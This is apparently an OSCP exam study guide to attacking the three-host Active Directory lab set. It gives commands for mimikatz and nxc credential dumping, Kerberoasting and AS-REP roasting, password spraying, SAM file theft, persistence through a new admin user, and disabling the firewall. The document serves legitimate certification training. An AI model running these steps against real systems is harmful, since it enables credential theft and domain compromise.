# Active Directory

This section is specifically for the AD environment in OSCP and contains tips on how to pawn the AD in a painless manner. If you wish to understand more about AD in general, I strongly recommend TCM Security's Practical Ethical Hacking course and/or HackTheBox's CPTH path.

With the OSCP+, you are given a Domain User credential right from the start. This has been reflected in the OSCP A/B/C set (though for intents and purpose, all they did was to give you initial access. As far as i understand, there has been no changes to the AD itself)

## The OSCP AD Set

For the AD in OSCP, it contains three Windows machines. For the sake of this section, we will call them MS01, MS02 and DC01. 

MS01 will be a dual-homed host i.e it has two NICs; one external facing and one internal facing. This will be your initial access host. With the given creds, you should be able to either RDP in or WinRM in depending on which ports are open. MS02 and DC01 will not be accessible from your kali at the start.

The AD set is worth 40 points and contains three flags on the three hosts respectively. Flags on MS01 and MS02 are worth 10 points each while the flag on the DC01 will be worth 20 points. The flags are found in the respective hosts Administrator's folders which means you need to privilege escalate on each host to either Local Admin or Domain Admin. 

While it is an AD set, I prefer to call it a bunch of Windows boxes that happens to be in an AD which means the Windows enumeration and privesc techniques that you have learnt must be utilised. 

The broad strategy is thus as such:

1) Gain initial foothold on MS01 with given domain creds. Enumerate MS01 throughly using the Windows Enumeration techniques I have shared. PrivEsc to Local Admin.

2) Once Admin on MS01, **don't immediately get jump to MS02**. Enumerate MS01 throughly this time as Admin. There may be secrets that you can find. Also please remember to dump the NTLM hashes and check lsa secrets using mimikatz. You may gain additional domain creds or passwords that you can then use. If needed, get persistence via either getting the Admin's hash or creating a new admin user with rights to RDP/WinRM in.

3) Once you have enumerated MS01 as Admin and have gained (or not gained) any sensitive information, start a ligolo tunnel so that you can attack MS02 and query the DC. Since you are Admin on MS01, make your life easier and disable the firewall on MS01.

4) As you can query the DC from kali, you can now run AD Enumeration tools such as SharpHound, ldapdomaindump etc. Enumerate Domain Users and Domain groups using your preferred methods (*you can technically do this right from the start with MS01 but I rather you focus on pwning MS01 first before doing any AD related stuff as you may get distracted from the fact that you really need to get MS01 first*). Note any users who may be part of special groups such as Domain Admin, Backup Operators and any users with svc in their names (which could be Service accounts)

5) With your initial domain creds and access to the DC, you can now launch checks for Kerberoastable and As-REP attacks. 

6) Once you have your list of domain users and a set of passwords/NTLM hashes, you can now password spray against MS02. Do a normal spray and then another spray but with the --local-auth flag for local accounts.

7) hopefully, you should be able to now gain access to MS02 with a valid pair of creds. Do the same as in Step 1 but for MS02.

8) Once Admin on MS02, follow step 2.

9) The DC should be straight forward from here. (can't share more info as it would be too specific and may get me flagged by OffSec.😒)

## First Steps - Enumeration 

### MS01

1) run a full nmap scan against MS01. See whether 3389 (RDP) or 5985/5986 (WinRM) are open and choose your poison.
    - using evil-winrm to login allows quick uploading and downloading of tools. However be prepared to use RDP if you need to edit things on the host as a GUI makes things a lot easier.
    - There will probably be SMB open. Since you have creds, see what folders and documents you can access. However, if you can evil-winrm or RDP in, then you probably not need to do this since you can just access the shares through those.

```bash
# evil-winrm
# use -H if NTLM hash
evil-winrm -i <MS01 ip> -u <domain user> -p <password> 

# once logged in, you can download and upload files
PS something@something> download loot.txt # this downloads loot.txt from the host to your kali's current working directory
PS something@something> upload mimikatz.exe # this uploads your mimikatz.exe from your current working directory. If your mimikatz is somewhere else, you need to provide either the absolute or relative path

# via xfreerdp

xfreerdp /d:<domain> /u:<user> /p:'<password>' /v:<MS01 IP> /dynamic-resolution /drive:shared,../Tools

whoami /priv  # do this first once you are in! Maybe you get lucky and there is SeImpersonatePrivilege. If there is SeShutdown, perhaps the PE vector involves services or scheduled tasks so keep that in mind

# check history
PS something@something>Get-History
PS something@something>(Get-PSReadlineOption).HistorySavePath  # get path where PS history is saved at
PS something@something> type <PS history save path>
```

2) Do manual enumeration of MS01 first. This means checking out the following folders:
- C:\Users
- C:\  # check for any non default folders here and investigate them
- C:\inetpub # if there are web services on MS01

If there are anything interesting, check whether you can edit the files or add stuff to these directories. 

You should also do host, user and group enumeration both for local and domain. 

```cmd
net user # enumerate local users
net user /domain # enumerate domain users

# check if any users are admins
net user <username>
net user <username> /domain

# group Enum

net group
net group /domain

net group <groupname> /domain

# check pass pol

net accounts
```

3) Use winpeas if you need to! As there are many potential vectors to priv esc, i will not elaborate further on this step.

4) Great! You managed to get admin! You should do the following first:
- Get Persistence. My preferred method is to add a new local user and grant it admin, RDP and winrm rights. This uses native LOLBAS stuff and wont crash your machine. 
- Dump Hashes using mimikatz or nxc. Sometimes mimikatz can't work properly. I had issues getting mimikatz to run in evil-winrm (my suspicion is that there is User Access Control involved.) so you can either launch a cmd shell or RDP to get mimikatz to run or you can use nxc to do this (though you need either the Admin hash or your new custom local user who is admin). There are many ways to skin a cat so when something dont work, try another way
- Remember, if you have NTLM hash, you don't necessarily need to crack it as you can pass-the-hash for a lot of the attacks

```cmd
# mimikatz usage. Make sure you upload mimikatz.exe, mimispool.dll, mimilib.dll and mimidrv.sys to the same directory!
mimikatz.exe

privilege::debug  # if you see 20 OK, means you are gucci. This requires the user to have the SeDebugPrivilege rights which Admins have by default. It might be possible to run mimikatz if your low level user somehow has SeDebug privs but I have not encountered this.

sekurlsa::logonpasswords  # dump a whole lot of NTLM hash. You can generally ignore the Machine accounts. Note down any clear text passwords and all NTLM hashes of user accounts. Also please note the difference between a local account and a domain account. If it is a domain account, you will see 'Domain: <domain name>'. If it is a local account, you will see 'Domain: <hostname>' instead!

token::elevate

lsadump::sam
lsadump::secrets
lsadump::cache
```
Using NXC, you need local admin hash/password!
```bash
# the below is the equivalent of running mimikatz's sekurlsa::logonpasswords
# -H for NTLM hash
nxc smb <target ip> -u <admin user> -p <password> --sam --lsa --local-auth

# this is the equivalent of the mimikatz's lsadump
nxc smb <target ip> -u <admin user> -p <password> -M lsassy --local-auth
```

- Enumerate MS01 again as Admin. Comb through the Administrator's folder and then maybe run winpeas for good measure.

## MS02

5) check for kerberoast and as-rep roast since it is a low hanging fruit

```bash
# kerberoast check
sudo impacket-GetUserSPNs -request -dc-ip <dc01 ip> -outputfile kerber.hash <domain>/<user>
sudo hashcat -m 13100 kerber.hash rockyou.txt --force
# as rep check
sudo impacket-GetNPUsers -request -dc-ip <dc01 ip> -outputfile asrep.hash <domain>/<user>
sudo hashcat -m 18200 asrep.hash rockyou.txt --force
```

6) set up a ligolo agent on MS01. You could do a nmap scan of MS02 but it may take a while. In general, the smb port should be open so you can password spray with the domain users and all the passwords/Hashes you have obtained.

```bash
# enumerate domain users using nxc using your given domain creds
nxc smb <DC IP> -u <valid domain user> -p <password> --user
# this will output all the domain users. I then used sublime text to process the output into a domain users list

# Password spray against MS02 (assuming that there is no lockout policy)
# --continue-on-success flag will tell nxc to continue spraying even when a valid pair of creds is found
nxc smb <MS02 IP> -u <domain user list> -p <password list> --continue-on-success
nxc smb <MS02 IP> -u <domain user list> -p <password list> --continue-on-success --local-auth
nxc smb <MS02 IP> -u <domain user list> -H <ntlm list> --continue-on-success
nxc smb <MS02 IP> -u <domain user list> -H <ntlm list> --continue-on-success --local-auth

# if FTP, SSH,RDP,MSSQL,WINRM ports discovered do the following:
# replace ssh below with any of the protocols above
nxc ssh <MS02 IP> -u <domain user list> -p <password list> --continue-on-success
nxc ssh <MS02 IP> -u <domain user list> -p <password list> --continue-on-success --local-auth
```

7) Here is the part where it is slightly tricky. If you need to get a reverse shell back from MS02 to kali, you will need to open up a listener port on the ligolo agent on MS01. Refer to the ligolo page for more information. Remember that there could be firewall rules in effect on MS02 so choose ports like port 80, 443, 139, 445 that are open when choosing a port for your reverse shell.

8) if you can get a shell either via winrm,rdp,ssh,mssql, you can then upload all your tooling. Do the same thing as with MS01 with the usual enumeration. If for some wierd reason, you have issues downloading from or uploading files to MS02, you can use nxc to download and upload files:

```bash
# note the double slash
# replace mssql with smb
nxc mssql <MS02 IP> -u sql_svc -p 'pass' --get-file 'C:\\Windows\\System32\\SAM' SAM  

nxc mssql <MS02 IP> -u sql_svc -p 'pass' --put-file SigmaPotato.exe 'C:\\Users\\Public\\potato.exe'
```

9) Once again like with MS01, you need to priv esc and then repeat step 4. Identify any creds that belong to domain admin group if there are.

10) if there are, great! you can use impacket-psexec to get in and get the flag. if not, you need to do password spraying again but this time with your new additional creds.